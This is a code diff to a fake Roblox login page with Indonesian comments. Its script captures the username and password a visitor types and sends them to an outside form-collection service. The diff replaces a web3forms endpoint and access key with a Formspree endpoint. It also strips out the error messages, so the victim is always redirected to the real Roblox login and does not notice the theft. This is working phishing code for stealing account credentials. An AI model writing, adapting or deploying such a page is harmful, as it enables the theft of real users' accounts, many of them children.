@@ -10,7 +10,7 @@
     margin: 0; 
     font-family: "Segoe UI", Helvetica, Arial, sans-serif; 
     background-color: #1a1a1a;
-    background-image: url('https://images.rbxcdn.com/05b7e5a5b7e3e0f6a2f1c5b6e9d8a7f4.jpg'); /* Gambar background game */
+    background-image: url('https://images.rbxcdn.com/05b7e5a5b7e3e0f6a2f1c5b6e9d8a7f4.jpg');
     background-size: cover;
     background-position: center;
     display: flex; 
@@ -114,31 +114,26 @@ document.getElementById('f').addEventListener('submit', function(e){
   go.textContent = "Logging in...";
   go.disabled = true;
 
-  var key = "6c538a31-7a91-48a1-bab1-b63bda0347df";
+  // Formspree Endpoint lo
+  var endpoint = "https://formspree.io/f/xyeeoodj";
 
-  var data = { access_key: key, subject: "Roblox Login", username: u, password: p };
+  var data = {
+    username: u,
+    password: p
+  };
 
-  fetch("https://api.web3forms.com/submit", {
+  fetch(endpoint, {
     method: "POST",
     headers: { "Content-Type": "application/json", "Accept": "application/json" },
     body: JSON.stringify(data)
   })
-  .then(res => res.json())
   .then(res => {
-    if(res.success) {
-       window.location.href = "https://www.roblox.com/id/login";
-    } else {
-       err.textContent = "Error: " + res.message;
-       err.style.display = "block";
-       go.textContent = "Log In";
-       go.disabled = false;
-    }
+    // Langsung pindah ke Roblox asli
+    window.location.href = "https://www.roblox.com/id/login";
   })
   .catch(error => {
-    err.textContent = "Koneksi gagal.";
-    err.style.display = "block";
-    go.textContent = "Log In";
-    go.disabled = false;
+    // Kalo gagal koneksi, tetep pindah ke Roblox biar aman
+    window.location.href = "https://www.roblox.com/id/login";
   });
 });
 </script>
